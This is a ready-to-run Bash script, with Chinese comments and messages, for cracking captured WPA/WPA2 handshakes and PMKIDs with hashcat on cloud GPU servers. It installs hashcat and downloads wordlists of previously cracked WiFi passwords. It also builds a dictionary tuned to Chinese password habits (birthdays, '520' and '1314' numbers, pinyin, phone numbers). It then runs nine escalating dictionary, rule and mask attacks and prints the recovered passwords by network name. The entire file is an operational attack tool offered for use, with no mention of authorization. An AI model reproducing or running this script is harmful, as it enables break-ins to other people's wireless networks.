#!/usr/bin/env bash
# ============================================================================
# WiFi握手包GPU破解 - 腾讯云/阿里云/任意Linux GPU服务器一键脚本
# 用法: bash crack.sh <hashline文件或直接粘贴>
# ============================================================================
set -e

# ── 脚本所在目录为工作目录 ──
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
WORK_DIR="$SCRIPT_DIR"
DICT_DIR="$WORK_DIR/dicts"
HASH_FILE="$WORK_DIR/hashes.22000"
POTFILE="$WORK_DIR/hashcat.potfile"
OUTFILE="$WORK_DIR/cracked.txt"

mkdir -p "$DICT_DIR"

# ── 颜色定义 ──
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

info()  { echo -e "${CYAN}[*]${NC} $1"; }
ok()    { echo -e "${GREEN}[+]${NC} $1"; }
warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
fail()  { echo -e "${RED}[x]${NC} $1"; }

# ============================================================================
# 第1步：环境检测与安装
# ============================================================================
echo ""
echo "============================================================"
echo "  WiFi握手包GPU破解 - 云服务器版"
echo "  支持: 腾讯云/阿里云/华为云/任意Linux GPU服务器"
echo "============================================================"
echo ""

# ── GPU检测 ──
info "检测GPU..."
if command -v nvidia-smi &>/dev/null; then
    nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>/dev/null && ok "GPU检测成功" || warn "nvidia-smi异常"
else
    warn "未检测到NVIDIA GPU（将使用CPU模式，速度较慢）"
fi

# ── hashcat检测与安装 ──
info "检测hashcat..."
HASHCAT_BIN=""

# 方式1: 系统已安装
if command -v hashcat &>/dev/null; then
    HASHCAT_BIN="hashcat"
    ok "hashcat已安装: $(hashcat --version 2>/dev/null)"
fi

# 方式2: 本地已编译
if [ -z "$HASHCAT_BIN" ] && [ -f "$WORK_DIR/hashcat-bin/hashcat" ]; then
    HASHCAT_BIN="$WORK_DIR/hashcat-bin/hashcat"
    ok "使用本地编译的hashcat: $($HASHCAT_BIN --version 2>/dev/null)"
fi

# 方式3: apt安装
if [ -z "$HASHCAT_BIN" ]; then
    info "尝试apt安装hashcat..."
    if apt-get update -qq 2>/dev/null && apt-get install -y -qq hashcat 2>/dev/null; then
        HASHCAT_BIN="hashcat"
        ok "apt安装成功: $(hashcat --version 2>/dev/null)"
    else
        warn "apt安装失败，从源码编译..."
    fi
fi

# 方式4: 源码编译
if [ -z "$HASHCAT_BIN" ]; then
    info "从源码编译hashcat..."
    HC_SRC="$WORK_DIR/hashcat-bin"
    if [ ! -d "$HC_SRC" ]; then
        git clone --depth=1 https://github.com/hashcat/hashcat.git "$HC_SRC" 2>&1 | tail -3
    fi
    if [ -f "$HC_SRC/Makefile" ]; then
        # 安装编译依赖
        apt-get install -y -qq build-essential 2>/dev/null || true
        cd "$HC_SRC" && make -j$(nproc) 2>&1 | tail -5
        cd "$WORK_DIR"
        if [ -f "$HC_SRC/hashcat" ]; then
            HASHCAT_BIN="$HC_SRC/hashcat"
            ok "编译成功: $($HASHCAT_BIN --version 2>/dev/null)"
        fi
    fi
fi

if [ -z "$HASHCAT_BIN" ]; then
    fail "hashcat安装失败！请手动安装: apt-get install hashcat"
    exit 1
fi

# ── hashcat GPU设备检测 ──
info "hashcat设备检测..."
$HASHCAT_BIN -I 2>/dev/null | grep -E "Device|Name|Type" | head -6 || warn "未检测到GPU设备"

# ============================================================================
# 第2步：下载密码字典
# ============================================================================
echo ""
echo "============================================================"
echo "  下载密码字典"
echo "============================================================"

download_dict() {
    local url="$1" path="$2" desc="$3"
    if [ -f "$path" ] && [ "$(wc -c < "$path")" -gt 100 ]; then
        local lines=$(wc -l < "$path")
        ok "$desc: 已存在 ($lines 条)"
        return 0
    fi
    info "下载 $desc..."
    if [[ "$url" == *.gz ]]; then
        wget -q --timeout=30 "$url" -O "${path}.gz" 2>/dev/null && gunzip -f "${path}.gz" 2>/dev/null
    else
        wget -q --timeout=60 "$url" -O "$path" 2>/dev/null
    fi
    if [ -f "$path" ] && [ "$(wc -c < "$path")" -gt 100 ]; then
        local lines=$(wc -l < "$path")
        ok "$desc: $lines 条"
    else
        warn "$desc: 下载失败"
    fi
}

# wpa-sec全球已破解密码
DICT_WPASEC="$DICT_DIR/wpa-sec-cracked.txt"
download_dict "https://wpa-sec.stanev.org/dict/cracked.txt.gz" "$DICT_WPASEC" "wpa-sec全球已破解WiFi密码(~75万条)"

# Probable-Wordlists WPA
DICT_PROBABLE="$DICT_DIR/probable-wpa.txt"
download_dict "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/WPA-Length/Top204Thousand-WPA-probable-v2.txt" "$DICT_PROBABLE" "Probable-Wordlists WPA(~20万条)"

# SecLists Top10K
DICT_SECLISTS="$DICT_DIR/seclists-10k.txt"
download_dict "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt" "$DICT_SECLISTS" "SecLists Top10000"

# ============================================================================
# 第3步：生成中国定制字典（Python脚本）
# ============================================================================
DICT_CHINA="$DICT_DIR/china-wifi.txt"
if [ -f "$DICT_CHINA" ] && [ "$(wc -c < "$DICT_CHINA")" -gt 1000 ]; then
    ok "中国定制字典: 已存在 ($(wc -l < "$DICT_CHINA") 条)"
else
    info "生成中国定制密码字典..."
    python3 -c "
import sys
seen = set()
count = 0
with open('$DICT_CHINA', 'w') as f:
    def add(s):
        global count
        if len(s) >= 8 and s not in seen:
            seen.add(s)
            f.write(s + '\n')
            count += 1
    # 8位数字高频
    for d in '0123456789':
        add(d*8); add(d*9); add(d*10)
    for start in range(10):
        add(''.join(str((start+i)%10) for i in range(8)))
        add(''.join(str((start-i)%10) for i in range(8)))
    for a in range(10):
        for b in range(10):
            for c in range(10):
                for d in range(10):
                    add(f'{a}{a}{b}{b}{c}{c}{d}{d}')
    for n in range(10000):
        s = f'{n:04d}'; add(s+s); add(s+s[::-1])
    # 生日
    for y in range(1960, 2012):
        for m in range(1, 13):
            for d in range(1, 32):
                if m in (4,6,9,11) and d>30: continue
                if m==2 and d>29: continue
                add(f'{y:04d}{m:02d}{d:02d}')
                add(f'{m:02d}{d:02d}{y:04d}')
    # 情感数字
    for i in range(100000):
        add(f'520{i:05d}'); add(f'{i:05d}520')
    for i in range(10000):
        add(f'1314{i:04d}'); add(f'{i:04d}1314')
    # 拼音+数字
    for py in ['woaini','nihao','mima','baobei','laogong','laopo','kuaile','shouji','wechat','weixin']:
        for sfx in ['123','1234','12345','123456','12345678','888','666','520','1314','0000','9999']:
            add(py+sfx); add(py.capitalize()+sfx)
    # 字母+数字
    for c in 'abcdefghijklmnopqrstuvwxyz':
        for num in ['1234567','12345678','123456789','11111111','88888888','00000000']:
            add(c+num); add(num+c)
    for c1 in 'abcdefghijklmnopqrstuvwxyz':
        for c2 in 'abcdefghijklmnopqrstuvwxyz':
            for num in ['123456','1234567','888888','666666']:
                add(c1+c2+num)
    # 4位组合
    p4 = ['0000','1111','2222','3333','4444','5555','6666','7777','8888','9999','1234','5678','1314','0520']
    for p1 in p4:
        for p2 in p4: add(p1+p2)
        for n in range(10000): add(p1+f'{n:04d}')
print(f'{count} 条')
" 2>/dev/null && ok "中国定制字典: $(wc -l < "$DICT_CHINA") 条" || warn "字典生成失败"
fi

# ── 字典汇总 ──
echo ""
info "字典汇总:"
TOTAL=0
for f in "$DICT_WPASEC" "$DICT_CHINA" "$DICT_PROBABLE" "$DICT_SECLISTS"; do
    if [ -f "$f" ]; then
        L=$(wc -l < "$f")
        TOTAL=$((TOTAL + L))
        printf "  %-40s %'10d 条\n" "$(basename "$f")" "$L"
    fi
done
printf "  %-40s %'10d 条\n" "合计" "$TOTAL"

# ============================================================================
# 第4步：加载握手包
# ============================================================================
echo ""
echo "============================================================"
echo "  加载握手包"
echo "============================================================"

# 如果命令行参数提供了.22000文件
if [ -n "$1" ] && [ -f "$1" ]; then
    cp "$1" "$HASH_FILE"
    ok "从文件加载: $1"
elif [ -f "$HASH_FILE" ]; then
    ok "使用已有哈希文件: $HASH_FILE"
else
    # 交互式粘贴
    echo ""
    warn "未找到握手包文件！"
    echo ""
    echo "  请选择加载方式:"
    echo "  1) 粘贴hashline（粘贴后按Ctrl+D结束）"
    echo "  2) 指定.22000文件路径"
    echo "  3) 退出"
    echo ""
    read -p "  请选择 [1/2/3]: " choice
    
    case "$choice" in
        1)
            echo "  请粘贴hashline（每行一条，粘贴完按Ctrl+D）:"
            cat > "$HASH_FILE"
            # 过滤只保留WPA*开头的行
            grep '^WPA\*' "$HASH_FILE" > "${HASH_FILE}.tmp" 2>/dev/null && mv "${HASH_FILE}.tmp" "$HASH_FILE"
            ;;
        2)
            read -p "  请输入.22000文件路径: " fpath
            if [ -f "$fpath" ]; then
                cp "$fpath" "$HASH_FILE"
            else
                fail "文件不存在: $fpath"
                exit 1
            fi
            ;;
        *)
            echo "  退出"
            exit 0
            ;;
    esac
fi

# 统计哈希数量
HASH_COUNT=$(grep -c '^WPA\*' "$HASH_FILE" 2>/dev/null || echo 0)
if [ "$HASH_COUNT" -eq 0 ]; then
    fail "未找到有效的WPA hashline！"
    fail "hashline格式: WPA*01*... 或 WPA*02*..."
    exit 1
fi
ok "加载 $HASH_COUNT 个WiFi握手包哈希"

# 显示目标列表
echo ""
info "目标列表:"
while IFS= read -r line; do
    if [[ "$line" == WPA* ]]; then
        IFS='*' read -ra PARTS <<< "$line"
        if [ "${#PARTS[@]}" -ge 6 ]; then
            TYPE="EAPoL"
            [ "${PARTS[1]}" = "01" ] && TYPE="PMKID"
            SSID_HEX="${PARTS[5]}"
            SSID=$(echo "$SSID_HEX" | xxd -r -p 2>/dev/null || echo "$SSID_HEX")
            MAC="${PARTS[3]}"
            BSSID="${MAC:0:2}:${MAC:2:2}:${MAC:4:2}:${MAC:6:2}:${MAC:8:2}:${MAC:10:2}"
            printf "  %-24s  %-19s  %s\n" "$SSID" "$BSSID" "$TYPE"
        fi
    fi
done < "$HASH_FILE"

# ============================================================================
# 第5步：9轮递进攻击
# ============================================================================
echo ""
echo "============================================================"
echo "  开始9轮递进攻击（字典→规则变异→掩码暴力）"
echo "  hashcat: $HASHCAT_BIN"
echo "============================================================"

# 清理旧结果
rm -f "$POTFILE" "$OUTFILE"

ATTACK_START=$(date +%s)
ALL_DONE=0

run_attack() {
    local name="$1"
    shift
    
    if [ "$ALL_DONE" -eq 1 ]; then return; fi
    
    echo ""
    echo "────────────────────────────────────────────────────"
    info "$name"
    echo "────────────────────────────────────────────────────"
    
    local start=$(date +%s)
    
    $HASHCAT_BIN -m 22000 "$HASH_FILE" \
        --potfile-path "$POTFILE" \
        --outfile "$OUTFILE" \
        --outfile-format 2 \
        -w 3 -O \
        "$@" 2>&1 | grep -E "Speed|Recovered|Progress|Candidates|Status|cracked" || true
    
    local elapsed=$(( $(date +%s) - start ))
    info "耗时: ${elapsed}秒"
    
    # 检查是否全部破解
    if [ -f "$POTFILE" ]; then
        local cracked=$(wc -l < "$POTFILE")
        if [ "$cracked" -ge "$HASH_COUNT" ]; then
            ok "全部 $HASH_COUNT 个握手包已破解！"
            ALL_DONE=1
        elif [ "$cracked" -gt 0 ]; then
            ok "已破解 $cracked/$HASH_COUNT 个"
        fi
    fi
}

# ── 攻击1: wpa-sec全球字典 ──
[ -f "$DICT_WPASEC" ] && run_attack "攻击1/9: wpa-sec全球已破解WiFi密码" -a 0 "$DICT_WPASEC"

# ── 攻击2: 中国定制字典 ──
[ -f "$DICT_CHINA" ] && run_attack "攻击2/9: 中国定制强密码字典" -a 0 "$DICT_CHINA"

# ── 攻击3: Probable + SecLists ──
if [ "$ALL_DONE" -eq 0 ]; then
    MERGED="$WORK_DIR/merged.txt"
    cat "$DICT_PROBABLE" "$DICT_SECLISTS" 2>/dev/null | sort -u > "$MERGED"
    [ -s "$MERGED" ] && run_attack "攻击3/9: Probable+SecLists合并字典" -a 0 "$MERGED"
fi

# ── 攻击4: 全字典+best64规则变异 ──
if [ "$ALL_DONE" -eq 0 ]; then
    ALL_MERGED="$WORK_DIR/all_merged.txt"
    cat "$DICT_WPASEC" "$DICT_CHINA" "$DICT_PROBABLE" "$DICT_SECLISTS" 2>/dev/null | sort -u > "$ALL_MERGED"
    RULE=""
    for rp in /usr/share/hashcat/rules/best64.rule \
              /usr/local/share/hashcat/rules/best64.rule \
              "$WORK_DIR/hashcat-bin/rules/best64.rule"; do
        [ -f "$rp" ] && RULE="$rp" && break
    done
    if [ -n "$RULE" ] && [ -s "$ALL_MERGED" ]; then
        run_attack "攻击4/9: 全字典+best64规则变异(×64倍)" -a 0 "$ALL_MERGED" -r "$RULE"
    fi
fi

# ── 攻击5: 8位纯数字 ──
run_attack "攻击5/9: 8位纯数字掩码(1亿组合)" -a 3 '?d?d?d?d?d?d?d?d'

# ── 攻击6: 字母前缀+7位数字 ──
if [ "$ALL_DONE" -eq 0 ]; then
    MASK_FILE="$WORK_DIR/prefix.hcmask"
    > "$MASK_FILE"
    for c in a q z w s x e d c r f v t g b y h n u j m; do
        echo "${c}?d?d?d?d?d?d?d" >> "$MASK_FILE"
        C=$(echo "$c" | tr '[:lower:]' '[:upper:]')
        echo "${C}?d?d?d?d?d?d?d" >> "$MASK_FILE"
    done
    run_attack "攻击6/9: 字母前缀+7位数字(中国常见)" -a 3 "$MASK_FILE"
fi

# ── 攻击7: 9位纯数字 ──
run_attack "攻击7/9: 9位纯数字掩码(10亿组合)" -a 3 '?d?d?d?d?d?d?d?d?d'

# ── 攻击8: 手机号模式 ──
run_attack "攻击8/9: 手机号模式(1+10位)" -a 3 '1?d?d?d?d?d?d?d?d?d?d'

# ── 攻击9: 10位纯数字 ──
run_attack "攻击9/9: 10位纯数字掩码(100亿组合)" -a 3 '?d?d?d?d?d?d?d?d?d?d'

# ============================================================================
# 第6步：结果展示
# ============================================================================
TOTAL_ELAPSED=$(( $(date +%s) - ATTACK_START ))
echo ""
echo "============================================================"
echo "  破解结果"
echo "============================================================"
echo ""

if [ -f "$POTFILE" ] && [ -s "$POTFILE" ]; then
    CRACKED=$(wc -l < "$POTFILE")
    ok "成功破解 $CRACKED/$HASH_COUNT 个WiFi密码！"
    echo ""
    echo "  SSID                      密码                  类型"
    echo "  ─────────────────────────  ────────────────────  ──────"
    
    while IFS=: read -r hash_part password; do
        IFS='*' read -ra HP <<< "$hash_part"
        if [ "${#HP[@]}" -ge 6 ]; then
            TYPE="EAPoL"
            [ "${HP[1]}" = "01" ] && TYPE="PMKID"
            SSID=$(echo "${HP[5]}" | xxd -r -p 2>/dev/null || echo "${HP[5]}")
            printf "  %-26s  %-20s  %s\n" "$SSID" "$password" "$TYPE"
        fi
    done < "$POTFILE"
    
    echo ""
    echo "  ── 密码汇总（方便复制）──"
    while IFS=: read -r hash_part password; do
        IFS='*' read -ra HP <<< "$hash_part"
        SSID=$(echo "${HP[5]}" | xxd -r -p 2>/dev/null || echo "${HP[5]}")
        echo "  $SSID: $password"
    done < "$POTFILE"
else
    warn "未破解任何密码"
    echo "  可能原因: 密码是强密码(字母+数字+符号混合且较长)"
    echo "  建议: 添加更大的字典(如rockyou.txt)"
fi

echo ""
info "总耗时: $((TOTAL_ELAPSED/60))分${TOTAL_ELAPSED%60}秒"
info "potfile: $POTFILE"
echo ""
